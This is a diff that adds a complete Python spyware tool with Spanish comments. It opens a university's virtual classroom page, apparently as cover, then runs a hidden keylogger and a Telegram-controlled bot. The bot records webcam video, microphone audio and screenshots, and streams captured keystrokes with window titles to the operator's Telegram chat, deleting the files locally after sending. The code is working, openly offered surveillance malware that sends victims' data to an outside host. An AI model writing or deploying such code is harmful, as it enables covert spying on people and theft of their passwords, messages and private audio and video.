@@ -1,0 +1,311 @@
+import requests
+import time as t
+import os
+import sys
+import threading
+import cv2
+import pyautogui
+from pynput import keyboard as k
+import pygetwindow as gw
+import wave
+import pyaudio
+import webbrowser
+
+webbrowser.open("https://aulavirtual.upc.edu.pe/")
+
+# === CONFIGURACIÓN ===
+BOT_API_TOKEN = "API_BOT_TELEGRAM"
+USER_ID = "TU_ID_TELEGRAM_USUARIO"
+LOG_INTERVAL = 10  # Intervalo de envío en segundos para /vivo
+
+# Variables globales
+keystrokes = []
+active_window_title = ""
+is_vivo_active = False
+stop_event = threading.Event()
+
+# Estado del bot como un objeto mutable para evitar errores de scope
+class BotState:
+    def __init__(self):
+        self.running = True
+
+bot_state = BotState()
+
+def get_active_window():
+    """Obtiene el título de la ventana activa"""
+    try:
+        window = gw.getActiveWindow()
+        if window is not None:
+            return window.title
+        return "Escritorio / Desconocido"
+    except:
+        return "Error al obtener ventana"
+
+def send_telegram_message(text=None, file_path=None, caption=""):
+    """Envía texto o archivo a Telegram de forma robusta"""
+    try:
+        url_base = f"https://api.telegram.org/bot{BOT_API_TOKEN}"
+        
+        if file_path and os.path.exists(file_path):
+            ext = file_path.split('.')[-1].lower()
+            
+            # Si es MP3, lo enviamos como Audio; si es WAV u otro, como Documento
+            if ext == 'mp3':
+                url = f"{url_base}/sendAudio"
+                with open(file_path, 'rb') as f:
+                    files = {'audio': f}
+                    data = {'chat_id': USER_ID, 'caption': caption}
+                    res = requests.post(url, data=data, files=files)
+            else:
+                # Para otros formatos, usamos sendDocument
+                url = f"{url_base}/sendDocument"
+                with open(file_path, 'rb') as f:
+                    files = {'document': f}
+                    data = {'chat_id': USER_ID, 'caption': caption}
+                    res = requests.post(url, data=data, files=files)
+            
+            if res.json()['ok']:
+                print(f"[+] Archivo enviado correctamente: {file_path}")
+                os.remove(file_path) # Limpieza
+            else:
+                print(f"[-] Error al enviar archivo: {res.json()}")
+                
+        elif text:
+            url = f"{url_base}/sendMessage"
+            payload = {"chat_id": USER_ID, "text": text}
+            res = requests.post(url, data=payload)
+            if res.json()['ok']:
+                print(f"[+] Mensaje enviado")
+            else:
+                print(f"[-] Error mensaje: {res.json()}")
+
+    except Exception as e:
+        print(f"[-] Excepción general en Telegram: {e}")
+
+def record_video(duration_secs, filename="temp_cam.mp4"):
+    """Graba video de la cámara web"""
+    cap = cv2.VideoCapture(0)
+    if not cap.isOpened():
+        send_telegram_message("❌ No se encontró cámara.")
+        return
+
+    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
+    out = cv2.VideoWriter(filename, fourcc, 15, (640, 480))
+    
+    start_time = t.time()
+    try:
+        while (t.time() - start_time) < duration_secs:
+            ret, frame = cap.read()
+            if ret:
+                out.write(frame)
+            t.sleep(1/15)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        cap.release()
+        out.release()
+        
+        if os.path.exists(filename):
+            send_telegram_message(
+                caption=f"🎥 Video grabado ({duration_secs}s)\n📍 Ventana: {get_active_window()}",
+                file_path=filename
+            )
+
+def record_audio(duration_secs, filename="recording.wav"):
+    """Graba audio del micrófono y lo convierte a MP3 si es posible"""
+    CHUNK = 1024
+    FORMAT = pyaudio.paInt16
+    CHANNELS = 1
+    RATE = 44100
+    
+    p = pyaudio.PyAudio()
+    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
+    
+    frames = []
+    for _ in range(0, int(RATE / CHUNK * duration_secs)):
+        data = stream.read(CHUNK)
+        frames.append(data)
+    
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+    
+    # Guardar WAV temporalmente
+    wav_filename = "temp_audio.wav"
+    wf = wave.open(wav_filename, 'wb')
+    wf.setnchannels(CHANNELS)
+    wf.setsampwidth(p.get_sample_size(FORMAT))
+    wf.setframerate(44100)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+    
+    final_file = wav_filename
+    
+    # Intentar convertir a MP3 usando pydub si está disponible
+    try:
+        from pydub import AudioSegment
+        sound = AudioSegment.from_wav(wav_filename)
+        mp3_filename = "recording.mp3"
+        sound.export(mp3_filename, format="mp3")
+        final_file = mp3_filename
+        print("[+] Conversión a MP3 exitosa")
+    except ImportError:
+        print("[+] Pydub no encontrado, enviando WAV")
+    except Exception as e:
+        print(f"[!] Error convirtiendo a MP3: {e}, enviando WAV")
+
+    # Enviar al usuario
+    caption = f"🎤 Grabación de audio\n⏱️ Duración: {duration_secs}s\n🕒 Hora: {t.strftime('%H:%M:%S')}"
+    send_telegram_message(caption=caption, file_path=final_file)
+    
+    # Limpieza final
+    for f in [wav_filename, "recording.mp3"]:
+        if os.path.exists(f):
+            os.remove(f)
+
+def on_press(key):
+    global active_window_title
+    active_window_title = get_active_window()
+    
+    try:
+        if hasattr(key, 'char') and key.char is not None:
+            keystrokes.append(key.char)
+        else:
+            special_key = str(key).replace('Key.', '')
+            # Lógica corregida para evitar [BS] innecesarios y manejar el espacio
+            if special_key == 'backspace':
+                keystrokes.append('[BS]')
+            elif special_key == 'space':
+                keystrokes.append(' ')  # Espacio simple, sin BS
+            elif special_key == 'enter':
+                keystrokes.append('\n[ENTER]\n')
+            elif special_key == 'tab':
+                keystrokes.append('\t[TAB]\t')
+            elif special_key == 'shift_l' or special_key == 'shift_r':
+                pass # Ignoramos shift solo
+            else:
+                keystrokes.append(f'[{special_key}]')
+    except:
+        pass
+
+# Iniciar escuchador de teclado
+listener_keyboard = k.Listener(on_press=on_press)
+listener_keyboard.start()
+
+def live_log_loop():
+    """Hilo que envia las pulsaciones cada 10 segundos si /vivo está activo"""
+    global is_vivo_active
+    while not stop_event.is_set():
+        t.sleep(LOG_INTERVAL)
+        if is_vivo_active and keystrokes:
+            log_data = ''.join(keystrokes)
+            # Enviamos como texto plano
+            send_telegram_message(f"⌨️ Actividad detectada\n📍 Ventana: {active_window_title}\n\n{log_data}")
+            keystrokes.clear()
+
+def listen_telegram_commands():
+    """Bucle principal para escuchar comandos desde Telegram"""
+    offset = -1
+    
+    # AQUÍ ESTÁ LA CLAVE: Usamos bot_state.running, NO bot_running
+    while bot_state.running:
+        try:
+            url = f"https://api.telegram.org/bot{BOT_API_TOKEN}/getUpdates?offset={offset}"
+            res = requests.get(url).json()
+            
+            if res['ok']:
+                updates = res['result']
+                for update in updates:
+                    msg = update.get('message', {})
+                    chat_id = str(msg.get('chat', {}).get('id', ''))
+                    text = msg.get('text', '').strip().lower()
+                    
+                    if chat_id == str(USER_ID) and 'echo' not in str(update):
+                        offset = update['update_id'] + 1
+                        
+                        if text == '/start':
+                            menu_text = """
+👋 **¡Bienvenido!** Sistema de Vigilancia Activo.
+
+🔹 **Comandos Disponibles:**
+• `/cam` → 📹 Graba video 30s
+• `/ss` → 🖥️ Captura de pantalla
+• `/audio` → 🎤 Graba audio 30s
+• `/vivo` → ⌨️ Modo Keylogger en tiempo real
+• `/stop` → 🛑 Apaga todo
+
+¡Estoy listo para vigilar! 🕵️‍♂️
+"""
+                            send_telegram_message(menu_text)
+                            
+                        elif text == '/cam':
+                            send_telegram_message("📹 Iniciando grabación de video...")
+                            threading.Thread(target=record_video, args=(30,), daemon=True).start()
+                            
+                        elif text == '/ss':
+                            send_telegram_message("📸 Tomando captura de pantalla...")
+                            fname = "screen.png"
+                            pyautogui.screenshot(fname)
+                            send_telegram_message(
+                                caption=f"🖥️ Captura actual\n📍 Ventana: {get_active_window()}",
+                                file_path=fname
+                            )
+                            
+                        elif text == '/audio':
+                            send_telegram_message("🎤 Iniciando grabación de audio...")
+                            threading.Thread(target=record_audio, args=(30,), daemon=True).start()
+                            
+                        elif text == '/vivo':
+                            global is_vivo_active
+                            if not is_vivo_active:
+                                is_vivo_active = True
+                                send_telegram_message("🟢 MODO VIVO ACTIVO: \n\nRecopilaré tus pulsaciones cada 10 segundos y te enviaré lo que escribas junto con la ventana activa. ¡A prueba de balas! 🚀")
+                            else:
+                                is_vivo_active = False
+                                send_telegram_message("🔴 MODO VIVO DETENIDO")
+                                
+                        elif text == '/stop':
+                            is_vivo_active = False
+                            stop_event.set()
+                            send_telegram_message("🛑 Apagando... Adiós 👋")
+                            listener_keyboard.stop()
+                            bot_state.running = False 
+                            break 
+
+        except Exception as e:
+            t.sleep(5)
+
+try:
+    # Lanzamos hilos
+    threading.Thread(target=listen_telegram_commands, daemon=True).start()
+    threading.Thread(target=live_log_loop, daemon=True).start()
+    
+    # MENSAJE AUTOMÁTICO AL INICIAR
+    send_telegram_message("""
+🔄 **Reinicio Detectado**
+
+Sistema reiniciado correctamente.
+Offset reseteado a cero.
+
+Escribe /start para ver el menú.
+""")
+
+    print("="*40)
+    print("🤖 Bot de Vigilancia Activo")
+    print("💬 Comandos por Telegram:")
+    print("   /start - Ver menú")
+    print("   /cam   - Grabar 30s de cámara")
+    print("   /ss    - Captura de pantalla")
+    print("   /audio - Grabar 30s de audio")
+    print("   /vivo  - Modo Keylogger en tiempo real")
+    print("   /stop  - Detener todo")
+    print("="*40)
+    
+    # Bloqueamos el hilo principal para que no termine
+    while bot_state.running:
+        t.sleep(1)
+            
+except KeyboardInterrupt:
+    print("\nFinalizado manualmente.")
+    bot_state.running = False
+    sys.exit()
